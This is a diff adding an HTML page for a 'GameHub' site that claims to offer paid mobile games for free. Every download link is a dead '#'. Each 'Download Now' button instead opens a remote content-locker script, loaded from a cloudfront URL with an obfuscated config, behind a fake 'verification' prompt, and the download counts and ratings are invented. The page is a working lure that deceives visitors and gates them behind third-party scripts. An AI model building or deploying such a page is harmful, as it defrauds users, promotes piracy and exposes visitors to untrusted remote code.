@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GameHub - Download Top Games</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Content Locker Script - Hada li 3titi -->
+    <script type="text/javascript">
+        var ocueZ_Icy_hmlYLc={"it":4596228,"key":"3d01b"};
+    </script>
+    <script src="https://d3v3431sr9puku.cloudfront.net/635a2d9.js"></script>
+    
+    <style>
+        /* Base Styles */
+        :root {
+            --primary-color: #6c5ce7;
+            --secondary-color: #a29bfe;
+            --dark-color: #2d3436;
+            --light-color: #f5f6fa;
+            --success-color: #00b894;
+            --warning-color: #fdcb6e;
+            --danger-color: #d63031;
+            --box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: var(--light-color);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        header {
+            background: rgba(26, 26, 46, 0.8);
+            backdrop-filter: blur(10px);
+            padding: 1.5rem 0;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            box-shadow: var(--box-shadow);
+        }
+
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .nav-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--light-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+        }
+
+        .logo i {
+            color: var(--primary-color);
+            margin-right: 0.5rem;
+        }
+
+        .hero {
+            padding: 8rem 0 4rem;
+            text-align: center;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="%236c5ce7" fill-opacity="0.1" d="M0,224L48,213.3C96,203,192,181,288,160C384,139,480,117,576,122.7C672,128,768,160,864,170.7C960,181,1056,171,1152,165.3C1248,160,1344,160,1392,160L1440,160L1440,0L1392,0C1344,0,1248,0,1152,0C1056,0,960,0,864,0C768,0,672,0,576,0C480,0,384,0,288,0C192,0,96,0,48,0L0,0Z"></path></svg>') no-repeat bottom;
+            background-size: contain;
+        }
+
+        .hero h1 {
+            font-size: 3.5rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(to right, #a29bfe, #6c5ce7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: fadeIn 1s ease;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 700px;
+            margin: 0 auto 2rem;
+            color: #b2bec3;
+        }
+
+        .games-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 2rem;
+            padding: 2rem 0;
+        }
+
+        .game-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            overflow: hidden;
+            transition: var(--transition);
+            box-shadow: var(--box-shadow);
+            animation: fadeUp 0.5s ease;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .game-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .game-thumbnail {
+            position: relative;
+            width: 100%;
+            overflow: hidden;
+            aspect-ratio: 1 / 1;
+        }
+
+        .game-thumbnail img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: var(--transition);
+        }
+
+        .game-card:hover .game-thumbnail img {
+            transform: scale(1.1);
+        }
+
+        .game-info {
+            padding: 1.5rem;
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+            justify-content: space-between;
+            gap: 1.2rem;
+        }
+
+        .game-title {
+            font-size: 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            margin: 0;
+        }
+
+        .game-logo {
+            width: 40px;
+            height: 40px;
+            margin-right: 10px;
+            border-radius: 10px;
+            object-fit: cover;
+        }
+
+        .game-stats {
+            display: flex;
+            justify-content: center;
+            gap: 1.5rem;
+            font-size: 0.9rem;
+            color: #b2bec3;
+            flex-wrap: wrap;
+            margin: 0;
+        }
+
+        .stat {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .stat i {
+            margin-bottom: 0.5rem;
+            color: var(--primary-color);
+            font-size: 1.2rem;
+        }
+
+        .trailer-section {
+            display: flex;
+            justify-content: center;
+            margin: 0.5rem 0;
+        }
+
+        .game-trailer {
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+            box-shadow: 0 4px 10px rgba(108, 92, 231, 0.4);
+        }
+
+        .game-trailer:hover {
+            background: var(--secondary-color);
+            transform: scale(1.1);
+            box-shadow: 0 6px 15px rgba(108, 92, 231, 0.6);
+        }
+
+        .download-btn {
+            display: block;
+            width: 100%;
+            padding: 1rem;
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            text-align: center;
+            text-decoration: none;
+            margin: 0;
+        }
+
+        .download-btn:hover {
+            background: var(--secondary-color);
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(108, 92, 231, 0.4);
+        }
+
+        .more-games-section {
+            text-align: center;
+            padding: 3rem 2rem;
+            margin: 2rem 0;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 20px;
+            border: 1px solid rgba(108, 92, 231, 0.2);
+            backdrop-filter: blur(5px);
+        }
+
+        .more-games-title {
+            font-size: 2rem;
+            margin-bottom: 1rem;
+            color: var(--light-color);
+        }
+
+        .more-games-title i {
+            color: var(--primary-color);
+            margin-right: 0.5rem;
+        }
+
+        .more-games-message {
+            font-size: 1.3rem;
+            color: #b2bec3;
+            margin-bottom: 1.5rem;
+            letter-spacing: 1px;
+        }
+
+        .coming-soon-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.8rem;
+            background: rgba(108, 92, 231, 0.15);
+            padding: 0.8rem 2rem;
+            border-radius: 50px;
+            border: 1px solid var(--primary-color);
+        }
+
+        .coming-soon-badge i {
+            font-size: 1.2rem;
+            color: var(--primary-color);
+        }
+
+        .coming-soon-badge span {
+            font-size: 1rem;
+            font-weight: 500;
+            color: #a29bfe;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content {
+            background: var(--dark-color);
+            width: 90%;
+            max-width: 900px;
+            border-radius: 15px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: rgba(0, 0, 0, 0.7);
+            color: white;
+            border: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            font-size: 1.5rem;
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        .video-container {
+            position: relative;
+            padding-bottom: 56.25%;
+            height: 0;
+            overflow: hidden;
+        }
+
+        .video-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        footer {
+            background: rgba(26, 26, 46, 0.8);
+            padding: 3rem 0;
+            margin-top: 4rem;
+            text-align: center;
+        }
+
+        .footer-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .footer-logo {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 1.5rem;
+            color: var(--light-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .footer-logo i {
+            color: var(--primary-color);
+            margin-right: 0.5rem;
+        }
+
+        .wish-message {
+            font-size: 1.5rem;
+            margin-bottom: 1.5rem;
+            color: var(--light-color);
+            text-align: center;
+            max-width: 800px;
+            line-height: 1.8;
+        }
+
+        .wish-message i {
+            color: var(--primary-color);
+            margin: 0 0.5rem;
+        }
+
+        .copyright {
+            color: #b2bec3;
+            font-size: 0.9rem;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 2.5rem; }
+            .hero p { font-size: 1rem; }
+            .games-grid { grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 1.5rem; }
+            .game-stats { gap: 1rem; }
+            .wish-message { font-size: 1.2rem; padding: 0 1rem; }
+            .footer-logo { font-size: 2rem; }
+            .game-info { gap: 1rem; }
+            .more-games-title { font-size: 1.5rem; }
+            .more-games-message { font-size: 1.1rem; }
+            .coming-soon-badge { padding: 0.6rem 1.5rem; }
+        }
+
+        @media (max-width: 480px) {
+            .hero { padding: 6rem 0 2rem; }
+            .hero h1 { font-size: 2rem; }
+            .games-grid { grid-template-columns: 1fr; }
+            .game-stats { flex-direction: column; gap: 0.8rem; }
+            .stat { flex-direction: row; justify-content: center; }
+            .stat i { margin-bottom: 0; margin-right: 0.5rem; }
+            .wish-message { font-size: 1.1rem; }
+            .footer-logo { font-size: 1.8rem; }
+            .game-info { gap: 0.8rem; }
+            .more-games-section { padding: 2rem 1rem; }
+            .more-games-message { font-size: 1rem; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container nav-container">
+            <a href="#" class="logo">
+                <i class="fas fa-gamepad"></i>
+                GameHub
+            </a>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="container">
+            <h1>Discover Amazing Games</h1>
+            <p>Here you will find the best mobile games for Android and iPhone that you won't find on the Play Store or App Store, including paid games for free. Download your game now and start playing!</p>
+        </div>
+    </section>
+
+    <main class="container">
+        <div class="games-grid" id="games-container"></div>
+
+        <div class="more-games-section">
+            <div class="more-games-title">
+                <i class="fas fa-gamepad"></i>
+                More Games
+            </div>
+            <div class="more-games-message">
+                Other Games will be added
+            </div>
+            <div class="coming-soon-badge">
+                <i class="fas fa-clock"></i>
+                <span>Stay tuned for more amazing games!</span>
+            </div>
+        </div>
+    </main>
+
+    <div class="modal" id="video-modal">
+        <div class="modal-content">
+            <button class="close-modal" id="close-modal">
+                <i class="fas fa-times"></i>
+            </button>
+            <div class="video-container">
+                <iframe id="yt-player" width="100%" height="100%" src="" frameborder="0" allowfullscreen></iframe>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container footer-content">
+            <div class="footer-logo">
+                <i class="fas fa-gamepad"></i>
+                GameHub
+            </div>
+            <div class="wish-message">
+                <i class="fas fa-gamepad"></i> 
+                We wish you endless fun and exciting adventures with our games! 
+                <i class="fas fa-heart"></i> 
+                Enjoy your gaming experience to the fullest!
+                <i class="fas fa-gamepad"></i>
+            </div>
+            <p class="copyright">© 2023 GameHub. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script>
+        // Game data - liens dyal download t7aydo
+        const games = [
+            { id: 1, title: "Bright Memory Infinite", logo: "https://image.api.playstation.com/vulcan/ap/rnd/202207/1509/tQsLe6PofTKMaTzqPk2dB65d.png?w=440&thumb=false", image: "https://image.api.playstation.com/vulcan/ap/rnd/202207/1509/tQsLe6PofTKMaTzqPk2dB65d.png?w=440&thumb=false", size: "1.14 GB", downloads: "2.4 M", rating: "4.8", trailer: "https://www.youtube.com/embed/phVF4gvknsM?si=XMguD8peOYqBY76Q", downloadLink: "#" },
+            { id: 2, title: "Gta San Andreas", logo: "https://images.seeklogo.com/logo-png/23/1/grand-theft-auto-san-andreas-logo-png_seeklogo-232812.png?v=1957908360816934384", image: "https://images.seeklogo.com/logo-png/23/1/grand-theft-auto-san-andreas-logo-png_seeklogo-232812.png?v=1957908360816934384", size: "1.10 GB", downloads: "1.8 M", rating: "4.7", trailer: "https://www.youtube.com/embed/bS22WPNJD2A?si=_vrOLj2Zk5T3Q5xq", downloadLink: "#" },
+            { id: 3, title: "Minecraft", logo: "https://i.imgur.com/gNVePyO.jpeg", image: "https://i.imgur.com/gNVePyO.jpeg", size: "602 MB", downloads: "1.5 M", rating: "4.6", trailer: "https://www.youtube.com/embed/X-fMtNOS_gU?si=IePRvYr_a3gsQFff", downloadLink: "#" },
+            { id: 4, title: "Street Fighter 4", logo: "https://i.imgur.com/ttb347N.jpeg", image: "https://i.imgur.com/ttb347N.jpeg", size: "865 MB", downloads: "3.1 M", rating: "4.9", trailer: "https://www.youtube.com/embed/_3_rt9Rn6yc?si=jRxuWVPDlHDhcKDn", downloadLink: "#" },
+            { id: 5, title: "Arcane Quest Legends 2", logo: "https://i.imgur.com/Dz4d7yc.jpeg", image: "https://i.imgur.com/Dz4d7yc.jpeg", size: "695 MB", downloads: "2.1 M", rating: "4.5", trailer: "https://www.youtube.com/embed/O32wwL8TCng?si=x7338RGVVcJnH1px", downloadLink: "#" },
+            { id: 6, title: "Truck Pro USA", logo: "https://i.imgur.com/A1vVFSJ.jpeg", image: "https://i.imgur.com/A1vVFSJ.jpeg", size: "1.13 GB", downloads: "1.9 M", rating: "4.7", trailer: "https://www.youtube.com/embed/NOTCPBfnjxc?si=8LSJ-wYk6OXaaqYt", downloadLink: "#" },
+            { id: 7, title: "Spiritfarer", logo: "https://i.imgur.com/FhyEU1O.jpeg", image: "https://i.imgur.com/FhyEU1O.jpeg", size: "1.04 GB", downloads: "1.7 M", rating: "4.5", trailer: "https://www.youtube.com/embed/UrTL2YeoRZQ?si=FcwOTwN3NxAyr-qB", downloadLink: "#" },
+            { id: 8, title: "Little Nightmares", logo: "https://i.imgur.com/yQiqNPt.jpeg", image: "https://i.imgur.com/yQiqNPt.jpeg", size: "912 MB", downloads: "1.3 M", rating: "4.6", trailer: "https://www.youtube.com/embed/SA2jH13CdMA?si=Whl7CYgFGO8wiDyx", downloadLink: "#" },
+            { id: 9, title: "Magic Rampage", logo: "https://i.imgur.com/z6AVHDd.jpeg", image: "https://i.imgur.com/z6AVHDd.jpeg", size: "146 MB", downloads: "2.6 M", rating: "4.3", trailer: "https://www.youtube.com/embed/iUaPvIPMUCU?si=zZiWfTHXka9YlSba", downloadLink: "#" },
+            { id: 10, title: "Demon Hunter Premium", logo: "https://lh3.googleusercontent.com/JbwZyvdw8Mtye9pEOu35Fl-eOGKlnHTNLBYTsoSYcgm9M4k-njlvJQZbO_ZcnFSvl1Lcs2EKs85c5AEM-32c-1Oun0Lx5KR2kK-HvjAY01-fnMpP=s128-rp-e7", image: "https://lh3.googleusercontent.com/JbwZyvdw8Mtye9pEOu35Fl-eOGKlnHTNLBYTsoSYcgm9M4k-njlvJQZbO_ZcnFSvl1Lcs2EKs85c5AEM-32c-1Oun0Lx5KR2kK-HvjAY01-fnMpP=s128-rp-e7", size: "1.01 GB", downloads: "2.3 M", rating: "4.7", trailer: "https://www.youtube.com/embed/ARXOAU0ZTNw?si=Sc7jnkidcT0DT5z8", downloadLink: "#" },
+            { id: 11, title: "Haak", logo: "https://assets-prd.ignimgs.com/2022/08/29/haak-button-2-1661808280487.jpg?width=300&crop=1%3A1%2Csmart&auto=webp", image: "https://assets-prd.ignimgs.com/2022/08/29/haak-button-2-1661808280487.jpg?width=300&crop=1%3A1%2Csmart&auto=webp", size: "405 MB", downloads: "2.8 M", rating: "4.5", trailer: "https://www.youtube.com/embed/c161HKeNKoI?si=qalkHZxx3ppJc8ZU", downloadLink: "#" },
+            { id: 12, title: "Ash Of God Redemption", logo: "https://i.imgur.com/MRxUMC0.jpeg", image: "https://i.imgur.com/MRxUMC0.jpeg", size: "1.98 GB", downloads: "1.6 M", rating: "4.5", trailer: "https://www.youtube.com/embed/k_j0fw8jh8M?si=wcN-Vk2Ca2uacxSe", downloadLink: "#" }
+        ];
+
+        const gamesContainer = document.getElementById('games-container');
+        const videoModal = document.getElementById('video-modal');
+        const closeModal = document.getElementById('close-modal');
+        const ytPlayer = document.getElementById('yt-player');
+
+        // Hadhi hiya lfunction li tft7 content locker - b tari9a sahiha
+        function openContentLocker() {
+            // Check if the locker's function exists - lfunction f lscript li 3titi tban smiyetha "ocueZ_Icy_hmlYLc" machi "_HL"
+            if (typeof ocueZ_Icy_hmlYLc !== 'undefined') {
+                console.log("Content locker ready, opening...");
+                // Hna kayna lfunction dyal locker
+                if (typeof _HL !== 'undefined' && typeof _HL === 'function') {
+                    _HL();
+                } else {
+                    // Bhal ma lfunction f lscript li 3titi machi _HL, hadchi ykhrj lik popup
+                    alert("Please complete the verification to continue downloading");
+                    // Hna t9der tzid lcode dyal locker li 3ndek
+                    // Ouverture dyal locker b tari9a manual
+                    var lockerScript = document.createElement('script');
+                    lockerScript.src = "https://d3v3431sr9puku.cloudfront.net/635a2d9.js";
+                    document.head.appendChild(lockerScript);
+                }
+            } else {
+                alert("Loading content locker, please try again in a moment.");
+                // Reload the locker script
+                var lockerScript = document.createElement('script');
+                lockerScript.src = "https://d3v3431sr9puku.cloudfront.net/635a2d9.js";
+                document.head.appendChild(lockerScript);
+            }
+        }
+
+        function displayGames() {
+            games.forEach(game => {
+                const gameCard = document.createElement('div');
+                gameCard.classList.add('game-card');
+                gameCard.innerHTML = `
+                    <div class="game-thumbnail">
+                        <img src="${game.image}" alt="${game.title}">
+                    </div>
+                    <div class="game-info">
+                        <h3 class="game-title">
+                            <img src="${game.logo}" alt="${game.title} Logo" class="game-logo">
+                            ${game.title}
+                        </h3>
+                        <div class="game-stats">
+                            <div class="stat">
+                                <i class="fas fa-download"></i>
+                                <span>${game.downloads}</span>
+                            </div>
+                            <div class="stat">
+                                <i class="fas fa-hdd"></i>
+                                <span>${game.size}</span>
+                            </div>
+                            <div class="stat">
+                                <i class="fas fa-star"></i>
+                                <span>${game.rating}</span>
+                            </div>
+                        </div>
+                        <div class="trailer-section">
+                            <button class="game-trailer" data-trailer="${game.trailer}">
+                                <i class="fas fa-play"></i>
+                            </button>
+                        </div>
+                        <button class="download-btn" data-game-id="${game.id}">Download Now</button>
+                    </div>
+                `;
+                gamesContainer.appendChild(gameCard);
+            });
+
+            document.querySelectorAll('.game-trailer').forEach(button => {
+                button.addEventListener('click', () => {
+                    const trailerUrl = button.getAttribute('data-trailer');
+                    ytPlayer.src = trailerUrl;
+                    videoModal.style.display = 'flex';
+                });
+            });
+
+            document.querySelectorAll('.download-btn').forEach(button => {
+                button.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    openContentLocker();
+                });
+            });
+        }
+
+        closeModal.addEventListener('click', () => {
+            videoModal.style.display = 'none';
+            ytPlayer.src = '';
+        });
+
+        videoModal.addEventListener('click', (e) => {
+            if (e.target === videoModal) {
+                videoModal.style.display = 'none';
+                ytPlayer.src = '';
+            }
+        });
+
+        document.addEventListener('DOMContentLoaded', () => {
+            displayGames();
+            document.querySelectorAll('.game-card').forEach((card, index) => {
+                card.style.animationDelay = `${index * 0.1}s`;
+            });
+        });
+    </script>
+</body>
+</html>
